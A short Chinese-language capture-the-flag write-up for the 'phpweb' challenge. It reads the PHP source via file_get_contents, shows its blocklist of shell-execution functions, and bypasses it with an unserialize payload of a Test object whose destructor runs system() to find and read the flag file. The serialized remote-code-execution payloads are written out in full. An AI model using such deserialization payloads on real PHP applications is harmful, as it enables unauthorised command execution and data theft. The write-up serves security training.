## phpweb

开题,发现数据包格式为

```
POST /index.php HTTP/1.1
Host: fd4d282d-79bc-446e-8a04-f553eb93bd86.node3.buuoj.cn
Content-Length: 29
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://fd4d282d-79bc-446e-8a04-f553eb93bd86.node3.buuoj.cn
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://fd4d282d-79bc-446e-8a04-f553eb93bd86.node3.buuoj.cn/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

func=date&p=Y-m-d+h%3Ai%3As+a
```

`func=date&p=Y-m-d+h%3Ai%3As+a`好像可以直接命令执行

`func=file_get_contents&p=index.php`,尝试直接读`index.php`

```php
   <?php
    $disable_fun = array("exec","shell_exec","system","passthru","proc_open","show_source","phpinfo","popen","dl","eval","proc_terminate","touch","escapeshellcmd","escapeshellarg","assert","substr_replace","call_user_func_array","call_user_func","array_filter", "array_walk",  "array_map","registregister_shutdown_function","register_tick_function","filter_var", "filter_var_array", "uasort", "uksort", "array_reduce","array_walk", "array_walk_recursive","pcntl_exec","fopen","fwrite","file_put_contents");
    function gettime($func, $p) {
        $result = call_user_func($func, $p);
        $a= gettype($result);
        if ($a == "string") {
            return $result;
        } else {return "";}
    }
    class Test {
        var $p = "Y-m-d h:i:s a";
        var $func = "date";
        function __destruct() {
            if ($this->func != "") {
                echo gettime($this->func, $this->p);
            }
        }
    }
    $func = $_REQUEST["func"];
    $p = $_REQUEST["p"];

    if ($func != null) {
        $func = strtolower($func);
        if (!in_array($func,$disable_fun)) {
            echo gettime($func, $p);
        }else {
            die("Hacker...");
        }
    }
    ?>
```

用反序列化绕过`disable_fun`

查找flag,`func=unserialize&p=O:4:"Test":2:{s:4:"func";s:6:"system";s:1:"p";s:19:"find /* | grep flag";}`,得到`/tmp/flagoefiu4r93`

读flag`func=unserialize&p=O:4:"Test":2:{s:4:"func";s:6:"system";s:1:"p";s:22:"cat /tmp/flagoefiu4r93";}`,得到`flag{951cf036-a74f-4cc2-a948-0e21cc39d4a7}`